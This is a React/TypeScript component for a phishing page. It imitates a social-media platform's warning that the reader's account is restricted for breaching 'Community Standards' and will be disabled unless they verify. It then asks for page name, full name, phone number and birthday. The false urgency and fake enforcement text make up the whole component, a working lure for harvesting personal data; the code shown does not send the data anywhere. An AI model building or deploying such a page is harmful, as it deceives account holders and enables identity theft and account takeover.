import React, { useState } from 'react';
import HomeImage from '@assets/home-image.png';
import getToday from '@utils/getToday';

const GetInfo: React.FC = () => {
	const [pageName, setPageName] = useState<string>('');
	const [yourName, setYourName] = useState<string>('');
	const [phoneNumber, setPhoneNumber] = useState<string>('');
	const [birthday, setBirthday] = useState<string>('');

	const [errors, setErrors] = useState<{ [key: string]: string }>({});

	const handleInputChange = (
		event: React.ChangeEvent<HTMLInputElement>,
		field: string,
	) => {
		const value = event.target.value;
		switch (field) {
			case 'pageName':
				setPageName(value);
				break;
			case 'yourName':
				setYourName(value);
				break;
			case 'phoneNumber':
				setPhoneNumber(value);
				break;
			case 'birthday':
				setBirthday(value);
				break;
		}
	};

	const validateInput = (field: string, value: string) => {
		let error = '';

		switch (field) {
			case 'pageName': {
				if (!value.trim()) error = 'Page name is required';
				break;
			}
			case 'yourName': {
				if (!value.trim()) error = 'Name is required';
				break;
			}
			case 'phoneNumber': {
				const phoneRegex = /^\d+$/;
				if (!value.trim()) {
					error = 'Phone Number is required';
				} else if (!phoneRegex.test(value)) {
					error = 'Invalid phone number';
				}
				break;
			}
			case 'birthday': {
				const dateRegex = /^(0\d|1[0-2])\/(0\d|[12]\d|3[01])\/\d{4}$/;
				if (!value.trim()) {
					error = 'Birthday is required';
				} else if (!dateRegex.test(value)) {
					error = 'Invalid date format (MM/DD/YYYY)';
				}
				break;
			}
			default:
				break;
		}

		setErrors((prevErrors) => ({
			...prevErrors,
			[field]: error,
		}));
	};

	return (
		<div className='flex w-11/12 flex-col justify-center md:w-1/3'>
			<div>
				<img src={HomeImage} className='w-full' alt='' />
				<b className='text-2xl'>Your account has been restricted</b>
				<p className='text-sm text-gray-500'>Term of Service</p>
				<hr />
			</div>
			<div className='my-5'>
				We detected unusual activity in your page today{' '}
				<strong>{getToday()}</strong>. Someone has reported your account
				for not complying with{' '}
				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
					Community Standards
				</b>
				. We have already reviewed this decision and the decision cannot
				be changed. To avoid having your account{' '}
				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
					disabled
				</b>{' '}
				, please verify:
			</div>
			<div className='my-5'>
				<input
					className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
					type='text'
					placeholder='Page Name'
					value={pageName}
					onChange={(event) => handleInputChange(event, 'pageName')}
					onBlur={() => validateInput('pageName', pageName)}
				/>
				{errors.pageName && (
					<p className='text-red-500'>{errors.pageName}</p>
				)}

				<input
					className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
					type='text'
					placeholder='Your Name (Name and Surname)'
					value={yourName}
					onChange={(event) => handleInputChange(event, 'yourName')}
					onBlur={() => validateInput('yourName', yourName)}
				/>
				{errors.yourName && (
					<p className='text-red-500'>{errors.yourName}</p>
				)}

				<input
					className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
					type='text'
					placeholder='Your Phone Number'
					value={phoneNumber}
					onChange={(event) =>
						handleInputChange(event, 'phoneNumber')
					}
					onBlur={() => validateInput('phoneNumber', phoneNumber)}
				/>
				{errors.phoneNumber && (
					<p className='text-red-500'>{errors.phoneNumber}</p>
				)}

				<input
					className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
					type='text'
					placeholder='Birthday (MM/DD/YYYY)'
					value={birthday}
					onChange={(event) => handleInputChange(event, 'birthday')}
					onBlur={() => validateInput('birthday', birthday)}
				/>
				{errors.birthday && (
					<p className='text-red-500'>{errors.birthday}</p>
				)}
			</div>
		</div>
	);
};

export default GetInfo;
